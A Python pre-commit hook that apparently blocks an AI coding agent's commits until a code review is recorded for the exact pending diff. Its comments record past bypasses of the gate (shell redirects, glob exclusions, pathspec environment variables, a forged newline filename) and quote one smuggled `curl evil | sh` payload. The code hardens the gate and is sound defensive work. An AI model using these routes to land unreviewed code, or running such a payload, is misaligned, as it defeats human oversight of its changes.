    A BARE NONEXISTENT PATH RETURNS None, NOT UNRESOLVABLE -- deliberately.
    It is safe BY CONSTRUCTION: git itself refuses such a commit ("did not
    match any file(s) known to git") and nothing from that pathspec lands,
    so there is no content to review and no bypass to prevent. Do not "harden" this case.
    Over-applying UNRESOLVABLE is a known regression class, because
    recording a review can NEVER clear an UNRESOLVABLE verdict: an
    armed-forever-after-`--` version of the origin scan permanently denied
    `git commit -m x -- reviewed.py && echo $(date)`, an ordinary chained
    command with nothing dangerous in its pathspec.

    (Wording note, 2026-09-21: this bullet used to read "shell-expanded
    token, or matching nothing at all", which two readers independently
    took to mean a bare typo yields UNRESOLVABLE. It does not -- that
    phrase described only the post-fragmentation remnant case. Rewritten
    after both misreadings; keep the distinction explicit if this is ever
    edited again.)
    """
    if not paths:
        return None
    # Checked BEFORE the digest, not after. Consulting it only on an empty
    # diff left a MIXED pathspec wide open: `-- pkg/mod.py $FILES` digests
    # exactly the same bytes as `-- pkg/mod.py` alone (the unexpanded token
    # contributes nothing to the diff), so reviewing the literal path cleared
    # a commit whose $FILES half landed unreviewed.
    if unresolvable(repo_root, cwd, list(paths)):
        return UNRESOLVABLE
    diff_text = pending_diff(repo_root, cwd, paths)
    if diff_text is None:
        return None  # git failure -> fail OPEN
    if diff_text.strip():
        return PRECOMMIT_PREFIX + digest_of(diff_text)
    return None


# ---------------------------------------------------------------------------
# --rekey safety predicate (AA-0064, 2026-09-01 agentic-systems-architect
# audit / gate-optimization plan waste-elimination P3).
#
# Gate 3b re-fires after an already-clean review whenever staging moves the
# digest — the documented case is an UNTRACKED file that gets `git add`ed
# AFTER the review was recorded: it contributes nothing to `git diff HEAD`
# while untracked (see `_untracked_material`'s own docstring), then appears
# as a normal tracked "added" file in that same diff once staged — same
# bytes, different SERIALIZATION, different digest. record_review.py's
# `--rekey <prior-key>` mode exists to carry the prior CLEAN outcome forward
# to the new digest ONLY when this reconstruction proves the two are the
# same content byte-for-byte (via SHA256 equality, `digest_of`) — never a
# fuzzy/partial match. THE SAFETY IS THIS EQUALITY CHECK; nothing here
# widens it into accepting a real content difference.
# ---------------------------------------------------------------------------


def _added_paths(repo_root: str, ordered: list[str]) -> set[str]:
    """Repo-root-relative paths within `ordered` that are newly ADDED
    relative to HEAD in the current `git diff HEAD` (status 'A') — the exact
    population `--rekey`'s reconstruction needs to try treating as untracked:
    a path can only ever show status 'A' by having no HEAD-committed blob at
    all, which is exactly the shape an untracked-file-then-staged transition
    produces (a rename/copy — 'R'/'C' — carries an OLD blob and is never
    eligible). Trying this set is what PROVES the predicate, not what
    ASSUMES it: `rekey_digest_if_only_untracked_became_staged` still requires
    the reconstructed digest to equal the prior one exactly, so including a
    path here that was NOT actually part of the prior untracked review
    simply fails to reproduce the digest and refuses, never a false accept.
    Returns an empty set on any git failure (fail toward "nothing to try",
    which only ever makes the reconstruction MORE conservative). Never
    raises.
    """
    if not ordered:
        return set()
    out = _git(repo_root, "diff", "HEAD", "--name-status", "-z", "--", *ordered)
    if not out:
        return set()
    added: set[str] = set()
    tokens = [t for t in out.split("\0") if t]
    i = 0
    n = len(tokens)
    while i < n:
        status = tokens[i]
        if status.startswith("A"):
            if i + 1 < n:
                added.add(tokens[i + 1])
            i += 2
        elif status.startswith(("R", "C")):
            # rename/copy: status, oldpath, newpath -- never eligible (a
            # renamed/copied file always has a real prior HEAD blob).
            i += 3
        else:
            i += 2
    return added


# A staged addition is only eligible for --rekey's reconstruction when its
# NEW git file mode is exactly this — a plain regular file, no executable
# bit, no symlink, no submodule gitlink. See _added_path_new_modes' own
# docstring for WHY: the untracked-content grammar reads raw bytes via a
# real open(), which (a) carries no mode bit at all and (b) FOLLOWS a
# symlink to its TARGET's content — so a file reviewed while untracked as a
# symlink digests identically to its post-staging real-file content, and a
# file reviewed while untracked with default permissions digests identically
# regardless of what executable bit it is staged with. Both are real content
# differences a byte-only comparison cannot see.
_PLAIN_FILE_MODE = "100644"


def _added_path_new_modes(repo_root: str, ordered: list[str]) -> dict[str, str]:
    """path -> new git file mode (e.g. "100644", "100755", "120000",
    "160000") for every path in `ordered` that shows status 'A' relative to
    HEAD in `git diff HEAD --raw` — the exact fact `--rekey`'s safety
    predicate needs to refuse a symlink/executable/gitlink addition that the
    untracked-content grammar alone cannot see (see `_PLAIN_FILE_MODE`'s own
    comment). Verified live against real git output (2026-09-01): with `-z`,
    each raw-diff record is `:oldmode newmode oldsha newsha status`, NUL,
    then the path, NUL — e.g. `:000000 120000 0000000 0224cd8 A\\0new_link.txt\\0`
    for a newly-staged symlink. Mirrors `_added_paths`'s own tokenizing
    convention exactly (a rename/copy carries two path tokens and is never
    eligible — a renamed/copied file always has a real prior HEAD blob, same
    as `_added_paths`). Returns `{}` on any git failure (fail toward
    "nothing known", which the caller treats as refusal-safe — a path
    missing from this dict never matches `_PLAIN_FILE_MODE`). Never raises.
    """
    if not ordered:
        return {}
    out = _git(repo_root, "diff", "HEAD", "--raw", "-z", "--", *ordered)
    if not out:
        return {}
    modes: dict[str, str] = {}
    tokens = [t for t in out.split("\0") if t != ""]
    i = 0
    n = len(tokens)
    while i < n:
        record = tokens[i]
        if not record.startswith(":"):
            i += 1
            continue
        fields = record[1:].split(" ")
        if len(fields) < 5:
            i += 1
            continue
        new_mode, status = fields[1], fields[4]
        if status.startswith("A"):
            if i + 1 < n:
                modes[tokens[i + 1]] = new_mode
            i += 2
        elif status.startswith(("R", "C")):
            i += 3
        else:
            i += 2
    return modes


def reconstruct_pending_diff_assuming_untracked(
    repo_root: str,
    cwd: str,
    paths: list[str],
    force_untracked: set[str],
    *,
    lossy_sink: list[str] | None = None,
) -> str | None:
    """The pending-diff text `pending_diff()` would have produced if every
    path in `force_untracked` (repo-root-relative) were UNTRACKED instead of
    its CURRENT (staged/tracked) state — formatted via the SAME
    `_format_untracked_entries()` grammar `_untracked_material` itself uses,
    never a re-derived approximation of it (this is what "never fork the
    normalization" means concretely: the tracked-diff half still comes from
    `git diff HEAD`, exactly as `pending_diff` computes it, only excluding
    the forced-untracked paths; the untracked half reuses the exact same
    formatter). Returns None on a git failure (fail toward "cannot
    reconstruct", which the caller treats as a refusal, never a silent
    accept). Never raises.

    `lossy_sink`, when passed a list, is forwarded to `_format_untracked_
    entries` unchanged — see that function's docstring for what "lossy"
    means. This function's own digest-producing behavior is unchanged by
    passing it; it is purely an observation channel for `rekey_digest_if_
    only_untracked_became_staged` to refuse on.

    GH #5886 (fix rounds 1-2): membership for BOTH halves is decided by GIT
    ITSELF, never a Python approximation of git's own pathspec matching. An
    earlier version excluded the tracked half by filtering `ordered` itself
    (the raw pathspec ENTRIES, which may be a directory) and re-added the
    untracked half only for a name literally EQUAL to one of those entries —
    which worked by coincidence when every entry was already a single file,
    but a DIRECTORY entry is never equal to the individual files under it, so
    it stayed in the tracked-diff half and `git diff HEAD -- <dir>` kept
    including those same files: DOUBLE-COUNTING them, once as a normal
    tracked "added" hunk, and again as reconstructed untracked material.
    Fixed by excluding at the FILE level via git's own negative pathspec
    magic (`:(exclude,literal)<path>`), which composes correctly with a
    directory entry exactly as `-- <dir>` does on its own — round 1.

    A COLD round-2 review then found membership was still being decided
    TWICE: git decided the tracked-diff exclusion via `:(exclude,literal)`,
    but an in-repo Python helper (matching an exact string or a real
    on-disk directory prefix) decided the untracked-re-add half — a
    vocabulary that understood nothing about git pathspec syntax itself. A
    name matched only through a glob (`src/*.py`), pathspec magic
    (`:(top)evil.py`), or the bare root pathspec (`.`) was excluded from the
    tracked half by git, then rejected by the Python helper on the
    untracked-re-add half — vanishing from the reconstruction entirely, so a
    never-reviewed file matched only that way could be staged alongside a
    reviewed one and `--rekey` would carry the stale clean outcome onto
    content that never included it. Fixed by letting git decide BOTH halves:
    the untracked set to re-add is simply `real_untracked (git ls-files
    --others, scoped to `ordered`) UNION force_untracked` (itself always
    derived from git's own `diff --name-status` added-paths list — see
    `_added_paths` — never a caller-supplied guess), with NO further Python
    filtering against the pathspec entries.

    BLOCKER B1 (a bare `:(exclude)<path>` pathspec is a GLOB by default):
    when a force-untracked path's literal name contains a git glob
    metacharacter (`*`, `?`, `[`, or the `\\` glob escape), the bare exclude
    matches every path the glob expands to — including tracked, modified,
    glob-matched SIBLINGS that were never part of `force_untracked` at all —
    and removes them from the tracked-diff half. Those siblings are not
    re-added by the untracked half (they are not untracked), so their
    content simply VANISHES from the reconstruction. `,literal` disables
    EVERY glob and magic interpretation for the pathspec, so the exclude
    matches ONLY the exact path string. Escaping individual characters is
    not a substitute: the set of special characters is larger than it looks.

    THE SHA256 BYTE-IDENTITY CHECK IN `rekey_digest_if_only_untracked_
    became_staged`, PLUS the lossless-material check `lossy_sink` feeds
    (fix-round-3/4, see `_format_untracked_entries`), together are the
    actual safety boundary here: membership widened by this function only
    decides WHICH names get a fair chance to reconstruct their real content
    — it never on its own proves a given name's content in the
    reconstruction is COMPLETE, correctly decoded, or UNAMBIGUOUSLY
    delimited from its neighbors, which is exactly what the lossless-
    material check (and `_digest_safe_name`'s control-character escaping)
    exist to catch.
    """
    if not paths:
        return None
    ordered = normalize_paths(repo_root, cwd, paths)
    exclude_specs = [f":(exclude,literal){p}" for p in force_untracked if p]
    diff = _git_diff_material(repo_root, "diff", "HEAD", "--", *ordered, *exclude_specs) if ordered else ""
    if diff is None:
        return None
    listing = _ls_untracked_names(repo_root, ordered) if ordered else []
    real_untracked = {n for n in (listing or []) if n}
    untracked_names = sorted(real_untracked | {n for n in force_untracked if n})
    return diff + _format_untracked_entries(repo_root, untracked_names, lossy_sink=lossy_sink)


def rekey_digest_if_only_untracked_became_staged(
    repo_root: str,
    cwd: str,
    paths: list[str],
    prior_digest_hex: str,
    *,
    lossy_sink: list[str] | None = None,
) -> str | None:
    """The CURRENT real `precommit:<digest>` key for `paths`, IFF a
    reconstruction that treats every currently-newly-ADDED path
    (`_added_paths`) as if it were still untracked reproduces
    `prior_digest_hex` (the bare 16-hex-char digest half of a
    `precommit:<digest>` key) EXACTLY via SHA256 equality (`digest_of`).

    Returns None (refuse) when: there is no currently-added path to try
    (nothing could have transitioned untracked->staged), any newly-added
    path's staged git mode is not a plain regular file (`_PLAIN_FILE_MODE`
    — refuses an executable bit, a symlink, or a submodule gitlink; see
    `_added_path_new_modes`'s own docstring for why the byte-only
    reconstruction alone cannot see this), the RECONSTRUCTION MATERIAL WAS
    LOSSY for any covered file (GH #5886 fix-round-3/4 — see below), the
    reconstruction does not reproduce the prior digest (a REAL content
    difference — not just staging), there is nothing currently pending, the
    current pending key is itself UNRESOLVABLE, or any git failure occurs.
    Never raises.

    THE SAFETY IS THIS BYTE-IDENTICAL (SHA256) EQUALITY CHECK PLUS THE
    PLAIN-REGULAR-FILE MODE CHECK PLUS THE LOSSLESS-MATERIAL CHECK — do not
    generalize any of the three into a fuzzy/partial match; a single
    differing byte anywhere in the reconstructed content, any added path
    staged as anything other than a plain 100644 regular file, or any single
    covered file whose untracked-material formatting was lossy, refuses.

    GH #5886 fix-round-3 (cold review), sharpened in fix-round-4 (R6-B1,
    cold trust-architect review): a byte-identical SHA256 equality against
    `reconstruct_pending_diff_assuming_untracked`'s output proves nothing
    when that output was produced LOSSILY or AMBIGUOUSLY. Round 3 covered
    invalid UTF-8 (`errors="replace"`), the per-file/aggregate read caps, and
    the file-count cap — live-reproduced end to end through the real CLI and
    the dispatcher's own `--rekey` hint. Round 4's cold review then landed a
    DEEPER defect end to end: the header line `_format_untracked_entries`
    renders for each name (`--- untracked <name> size=<n>`) embedded the raw
    name VERBATIM, so a filename containing its own literal newline plus a
    fabricated `--- untracked <other-name>` fragment reconstructed BYTE-FOR-
    BYTE IDENTICALLY to two separate, genuinely different real files named
    the fabricated pieces — a single reviewed, weirdly-named directory
    entry digested identically to two ordinary staged files, one of them
    carrying a smuggled `os.system('curl evil | sh')` payload, landed via
    `--rekey` and gate 3b in the cold review's own repro. Fixed by
    `_digest_safe_name` (see that function and `_format_untracked_entries`'s
    own docstrings): a name containing any control character renders as an
    unambiguous `\\0`-prefixed JSON string instead of verbatim text, and an
    UNREADABLE entry is now ALSO treated as lossy (round 3 excluded it,
    reasoning a transition to/from unreadable already moves the digest —
    true for THAT transition, but it does not rule out two different
    unreadable files coinciding on stat-only fields under attacker-
    controlled timing). `reconstruct_pending_diff_assuming_untracked`'s
    `lossy_sink` parameter is the mechanical fix: this function threads its
    OWN internal list through to it and refuses outright the moment ANYTHING
    is appended, regardless of whether the digest happens to match — a
    lossy or ambiguous reconstruction is never trusted, matching or not.

    The caller-supplied `lossy_sink` (this function's own keyword-only
    parameter, distinct from the internal list above) receives every reason
    string the internal reconstruction collected, REGARDLESS of whether that
    is what ultimately caused the refusal (a mode mismatch or "nothing
    added" is checked first and can refuse before the reconstruction ever
    runs, in which case `lossy_sink` stays untouched). A caller wanting to
    print a DIFFERENT message for "refused because lossy" versus "refused
    for any other reason" checks `bool(lossy_sink)` after a `None` return —
    a non-empty list means lossiness was at least PART of why this call
    refused (`record_review.py`'s `--rekey` CLI does exactly this).
    """
    try:
        ordered = normalize_paths(repo_root, cwd, paths)
        added = _added_paths(repo_root, ordered)
        if not added:
            return None
        modes = _added_path_new_modes(repo_root, ordered)
        if any(modes.get(p) != _PLAIN_FILE_MODE for p in added):
            return None
        lossy: list[str] = []
        reconstructed = reconstruct_pending_diff_assuming_untracked(
            repo_root, cwd, paths, added, lossy_sink=lossy
        )
        if lossy_sink is not None:
            lossy_sink.extend(lossy)
        if reconstructed is None or not reconstructed.strip():
            return None
        if lossy:
            return None
        if digest_of(reconstructed) != prior_digest_hex:
            return None
        current_key = pending_key(repo_root, cwd, paths)
        if not current_key or current_key == UNRESOLVABLE:
            return None
        return current_key
    except Exception:
        return None


def _any_path_is_a_directory(cwd: str, paths: list[str]) -> bool:
    """True iff any RAW (un-normalized) token in `paths` resolves to a real
    directory on disk relative to `cwd`.

    HISTORY (GH #5886): Item 6 (2026-09-01 fix round) introduced this check
    because --rekey's reconstruction only ever partitioned at the individual
    FILE level, so a directory-shaped `--paths` token could NEVER be
    correctly excluded from the tracked-diff half and --rekey would always
    refuse for it; this function existed purely to stop `decide()` from
    advertising a command that structurally could not succeed. That
    limitation is fixed (fix rounds 1-2): `reconstruct_pending_diff_
    assuming_untracked` now lets GIT decide both halves of the
    reconstruction via `:(exclude,literal)` pathspec magic and its own
    `ls-files`/`diff --name-status` listings, with no Python approximation
    of pathspec matching at all, so --rekey genuinely CAN succeed for a
    directory pathspec now, when the underlying content is byte-identical
    and lossless (see `rekey_digest_if_only_untracked_became_staged`).

    This function itself is UNCHANGED and still used the same way: it is a
    HINT SUPPRESSOR only, never a safety boundary. `rekey_digest_if_only_
    untracked_became_staged`'s byte-identical-and-lossless predicate is what
    actually decides whether a --rekey call succeeds, regardless of this
    check. Kept (rather than removed) as an extra-conservative hint filter: a
    directory pathspec commonly covers files beyond the ones that were ever
    reviewed together, so suppressing the *hint* for a directory token avoids
    advertising a command that will often still refuse for an unrelated
    reason (an extra untracked file swept in under the same directory). The
    caller is free to run --rekey directly; this only affects whether
    decide() proactively SUGGESTS it. Never raises; any failure resolves to
    False (the conservative direction for a HINT: worst case is suggesting a
    command that then refuses loudly, exactly as it always could for other
    reasons too — this check is a courtesy, not a safety boundary)."""
    try:
        for p in paths:
            if not p:
                continue
            candidate = p if os.path.isabs(p) else os.path.join(cwd, p)
            if os.path.isdir(candidate):
                return True
        return False
    except Exception:
        return False


def _ledger_readable(ledger_path: str) -> bool:
    """True when the ledger is absent (legitimately empty) or readable.

    False ONLY when it exists but cannot be read — the one case where "no
    entry on record" is a lie we must not act on.
    """
    try:
        if not os.path.exists(ledger_path):
            return True
        if not os.path.isfile(ledger_path):
            return False
        with open(ledger_path, encoding="utf-8"):
            return True
    except Exception:
        return False


def record_command(paths: list[str], repo_root: str | None = None) -> str:
    """The exact command that clears this gate — printed in the denial.

    Carries the repo directory as an explicit positional so the line is
    copy-pasteable from ANY cwd; without it, running the remedy from a
    subdirectory recorded against the wrong target.
    """
    # shlex.quote every token: four tracked files in this project already
    # contain spaces. Unquoted, the printed remedy split one path into three
    # arguments, recorded nothing, reported "no pending change vs HEAD", and
    # left the deny permanently unclearable while explaining it wrongly.
    joined = " ".join(shlex.quote(p) for p in sorted(set(paths)))
    target = f" {shlex.quote(repo_root)}" if repo_root else ""
    return (
        f"python3 ~/.claude/hooks/record_review.py{target} --pre-commit --clean --paths " + joined
    )


def decide(
    repo_root: str | None,
    cwd: str,
    paths: list[str] | None,
    ledger_path: str | None = None,
    command: str | None = None,
) -> tuple[bool, str, dict]:
    """(block, reason, detail) for a pending commit. NEVER raises.

    Blocks only on a positive finding:
      * the RAW command contains an unquoted command-substitution construct
        this hook cannot see through (see
        command_has_unquoted_command_substitution), or
      * no review entry at all for this exact pending content, or
      * an entry whose recorded outcome is unresolved blockers.

    An entry with an UNKNOWN outcome (a bare `record_review.py` with no
    --clean/--blockers) satisfies this gate: "was it reviewed at all" is the
    question here, and treating unknown as unreviewed would punish the
    existing recording style rather than the behavior being targeted.

    `command` is the raw shell command text, when the caller has it (the live
    dispatcher always does; direct/unit-test callers that only care about a
    resolved path list may omit it, which simply skips this one check —
    exactly like every OTHER caller before this parameter existed). Checked
    here, inside the SAME disabled_by_operator()-gated decision, rather than
    as a separate pre-check in pretooluse_bash.py, so CSA_NO_PRECOMMIT_REVIEW
    covers it automatically instead of needing its own bypass wiring.

    The command check runs BEFORE the `not repo_root or not paths` guard,
    deliberately: it needs neither (it is a pure scan of the raw text), and
    round-3 verification found that ordering it AFTER meant this check's
    only real-world protection depended on gate 3 (check_staged_scope)
    happening to deny first whenever the pathspec resolved to nothing at
    all — true today, but undocumented and untested, i.e. an accident of
    gate ordering rather than a guarantee this module makes on its own.

    GH #5886 fix-round-4 (R6-B2): the `_PATHSPEC_ENV_VARS` check runs
    immediately after the command-substitution check, for the identical
    reason -- it needs neither `repo_root` nor `paths` either (it is a pure
    environment read), and it must fire before ANY digest is computed: once
    one of these vars is set, this module cannot trust its own git calls to
    agree with what the real `git commit` will do, so there is no safe
    digest to compute at all.
    """
    try:
        if disabled_by_operator():
            return (False, "", {})
        if command and command_has_unquoted_command_substitution(command):
            return (
                True,
                REASON_UNRESOLVABLE,
                {"paths": sorted(set(paths or []))[:20]},
            )
        env_hits = pathspec_env_vars_present()
        if env_hits:
            return (
                True,
                REASON_PATHSPEC_ENV_SET,
                {"env_vars": env_hits, "paths": sorted(set(paths or []))[:20]},
            )
        if not repo_root or not paths:
            return (False, "", {})
        escaped = tokens_outside_repo(repo_root, cwd, paths)
        if escaped:
            # #4933: deny-with-guidance instead of the git-failure fail-open.
            # message_for() tells the caller to end the command at the
            # pathspec; recording can never clear this reason.
            return (
                True,
                REASON_OUTSIDE_REPO,
                {"outside": escaped[:5], "paths": sorted(set(paths))[:20]},
            )
        ledger = ledger_path or _lib.LAST_REVIEWED
        key = pending_key(repo_root, cwd, paths)
        if key is None:
            return (False, "", {})
        if key is UNRESOLVABLE or key == UNRESOLVABLE:
            return (
                True,
                REASON_UNRESOLVABLE,
                {"paths": sorted(set(paths))[:20]},
            )
        if not _ledger_readable(ledger):
            # Documented fail-open: an unreadable ledger is indistinguishable
            # from "no entry" downstream, and recording cannot clear it, so a
            # deny here would be unclearable.
            return (False, "", {})

        outcome = rr.head_review_outcome(ledger, repo_root, key)
        if outcome is None:
            unreviewed_detail: dict = {"digest": key, "paths": sorted(set(paths))[:20]}
            # AA-0064 hint (2026-09-01, waste-elimination P3): a HINT ONLY --
            # this never changes the block/allow decision above. When a CLEAN
            # review already exists for these SAME paths at a DIFFERENT
            # digest, message_for() prints the exact --rekey command so the
            # caller can try the cheap, mechanically-verified reconstruction
            # before paying for a full re-review that may be unnecessary.
            # Item 6 (2026-09-01 fix round): never suggest it at all when any
            # current path is a directory. This is a USABILITY suppression
            # only, not a correctness one -- fix rounds 1-2 already made
            # --rekey genuinely ABLE to succeed for a directory pathspec (see
            # _any_path_is_a_directory's own docs, corrected fix-round-8
            # same-text pass: this comment previously said "structurally
            # cannot succeed," which stopped being true once that fix
            # landed). The suppression stays because a directory pathspec
            # commonly sweeps in files beyond the ones reviewed together,
            # which would make the suggested command a refusal waiting to
            # happen for an unrelated reason; the caller may still run
            # --rekey against a directory pathspec directly.
            hint_key = None
            try:
                if not _any_path_is_a_directory(cwd, list(paths)):
                    hint_key = rr.find_clean_precommit_entry_for_paths(ledger, repo_root, list(paths))
            except Exception:
                hint_key = None
            if hint_key and hint_key != key:
                unreviewed_detail["rekey_hint"] = hint_key
            return (True, REASON_UNREVIEWED, unreviewed_detail)
        status, count = outcome
        if status == rr.OUTCOME_BLOCKERS:
            return (
                True,
                REASON_BLOCKERS,
                {"digest": key, "blockers": count, "paths": sorted(set(paths))[:20]},
            )
        return (False, "", {})
    except Exception:
        # Fail OPEN: a broken gate must never wedge a commit.
        return (False, "", {})


def reviewer_of_record(paths: list[str], repo_root: str | None) -> str:
    """Which reviewer the denial should name. A repo may declare its
    trust-surface paths in `<repo>/.claude/oversight/trust_surface.json`
    (`trust_surface_globs`) or in `manifest.json` as `security.trust_surface_globs`
    (both are read and merged) (fnmatch patterns, repo-relative); a
    pathspec touching any of them names trust-architect, which SUBSTITUTES for
    code-reviewer (CLAUDE.md §10/§13), never stacks. Fails open to
    code-reviewer on any missing/unreadable manifest. fnmatch's `*` also
    matches `/`, so `modules/billing/*` covers subdirectories on purpose; a
    directory pathspec (`modules/billing`) matches any glob under it. This only
    NAMES the reviewer — gate 3b still accepts any recorded review (the known
    §10 gap: which reviewer ran is not enforced)."""
    import fnmatch

    default = "the Opus code-reviewer"
    if not repo_root:
        return default
    globs: list = []
    oversight = os.path.join(repo_root, ".claude", "oversight")
    for name, pick in (("trust_surface.json", lambda d: d.get("trust_surface_globs")),
                       ("manifest.json", lambda d: (d.get("security") or {}).get("trust_surface_globs"))):
        try:
            with open(os.path.join(oversight, name), encoding="utf-8") as fh:
                found = pick(json.load(fh))
        except (OSError, ValueError, AttributeError):
            continue
        if isinstance(found, list):
            globs.extend(g for g in found if isinstance(g, str))
    if not globs:
        return default
    for raw in paths:
        rel = raw
        if os.path.isabs(raw):
            try:
                rel = os.path.relpath(raw, repo_root)
            except ValueError:
                continue
        if rel.startswith("./"):
            rel = rel[2:]
        rel_dir = rel.rstrip("/") + "/"
        for g in globs:
            if isinstance(g, str) and (fnmatch.fnmatch(rel, g) or g.startswith(rel_dir)):
                return ("trust-architect (reviewer of record for trust-surface paths; it "
                        "substitutes for code-reviewer, never stacks)")
    return default


def message_for(
    reason: str, detail: dict, paths: list[str], repo_root: str | None = None
) -> str:
    """Operator-facing denial text: what happened, why, and the way through."""
    tail = (
        "\nRollback lever if this gate itself is misfiring: "
        "CSA_NO_PRECOMMIT_REVIEW=1 (this gate only).\n"
        "See ~/.claude/.enforcement/log.jsonl."
    )
    if reason == REASON_BLOCKERS:
        n = detail.get("blockers", 1)
        return (
            f"{HOOK_NAME}: BLOCKED — the review of this exact change recorded "
            f"{n} unresolved blocker(s). Committing over a known blocker is what "
            "the review boundary exists to prevent. Fix them, re-run the "
            "code-reviewer, then record the new result:\n  "
            + record_command(paths, repo_root)
            + tail
        )
    if reason == REASON_OUTSIDE_REPO:
        outside = ", ".join(detail.get("outside", [])[:5]) or "(token)"
        return (
            f"{HOOK_NAME}: BLOCKED — a token in this commit's pathspec resolves "
            f"OUTSIDE the repository ({outside}). This is almost always a shell "
            "redirect's argument riding after the pathspec — e.g. `-- a.py 2> "
            "/tmp/e.log` — which used to defeat pending-content resolution and "
            "silently WAIVE review (#4933). End the command at the pathspec "
            "(use `-F <msgfile>` for messages, nothing after the last path) and "
            "re-issue. Recording a review can NEVER clear this reason."
            + tail
        )
    if reason == REASON_UNRESOLVABLE:
        return (
            f"{HOOK_NAME}: BLOCKED — this commit's pathspec could not be resolved to "
            "real content, so there is no way to tell what it would land. This hook "
            "sees the command BEFORE the shell expands it, so an unexpanded `$VAR`, "
            "an unquoted `$(...)`/backtick command substitution after `--`, or a "
            "leading `~` reaches it as literal text it cannot evaluate. (A glob like "
            "`*.py` is NOT this case — git expands those itself.)\n"
            "Re-run the commit with literal, quoted paths, then review and record "
            "them. Refusing an unreadable pathspec is deliberate: treating it as "
            "'nothing pending' would let the expanded content through unreviewed."
            + tail
        )
    if reason == REASON_PATHSPEC_ENV_SET:
        env_vars = ", ".join(detail.get("env_vars", [])) or "a GIT_*_PATHSPECS variable"
        return (
            f"{HOOK_NAME}: BLOCKED — {env_vars} is set in the environment. Each of "
            "GIT_LITERAL_PATHSPECS/GIT_GLOB_PATHSPECS/GIT_NOGLOB_PATHSPECS/"
            "GIT_ICASE_PATHSPECS changes how git itself interprets a pathspec, so "
            "this hook cannot compute a digest it can trust to mean the same thing "
            "the real commit will do. Unset the variable and re-issue the commit, "
            "then review and record as usual. Recording a review can NEVER clear "
            "this reason — this is not a review gap, it is an environment that "
            "makes the content ambiguous."
            + tail
        )
    rekey_hint = detail.get("rekey_hint")
    hint_block = ""
    if rekey_hint:
        joined = " ".join(shlex.quote(p) for p in sorted(set(paths)))
        target = f" {shlex.quote(repo_root)}" if repo_root else ""
        hint_block = (
            f"\nA CLEAN review already exists for these SAME paths at a different "
            f"digest ({rekey_hint}). If the only change since then is staging a "
            "previously-untracked file, try the cheap re-key first — it refuses "
            "loudly (nothing recorded) rather than silently accept whenever: the "
            "content actually differs, any newly-staged path is not a plain "
            "regular file (an executable bit, a symlink, or a submodule gitlink "
            "all refuse), or the current digest already has ANY review on record "
            "(so it can never overwrite an existing outcome, including unresolved "
            "blockers), or the reconstruction hit any lossy/ambiguous material — a "
            "file past the per-file or aggregate read cap, a non-UTF-8 file of any "
            "size, a file "
            "past the readable-file-count cap (roughly 1000 readable files), or an "
            "unreadable file (see the module docs) — or the cited digest's own "
            "chain root was recorded before the current digest format (no dg=2 on "
            "record; see rekey-root-digest-format-stale in the docs). Prefer "
            "individual file paths over a directory token for both the original "
            "review and this rekey — a directory commonly sweeps in files beyond "
            "the ones reviewed together, which would make this command refuse for "
            "an unrelated reason:\n  "
            f"python3 ~/.claude/hooks/record_review.py{target} --rekey {rekey_hint} "
            f"--paths {joined}\n"
        )
    return (
        f"{HOOK_NAME}: BLOCKED — no code review is on record for the exact content "
        "this commit would land. Review happens BEFORE the commit, not after it.\n"
        + hint_block
        + f"  1. Run {reviewer_of_record(paths, repo_root)} over these paths.\n"
        "  2. Record its ACTUAL outcome (--clean, or --blockers <n>):\n     "
        + record_command(paths, repo_root)
        + "\n  3. Re-run the same commit.\n"
        "Editing any reviewed path after step 2 moves the digest and re-fires "
        "this gate — by design; that would be different content."
        + tail
    )
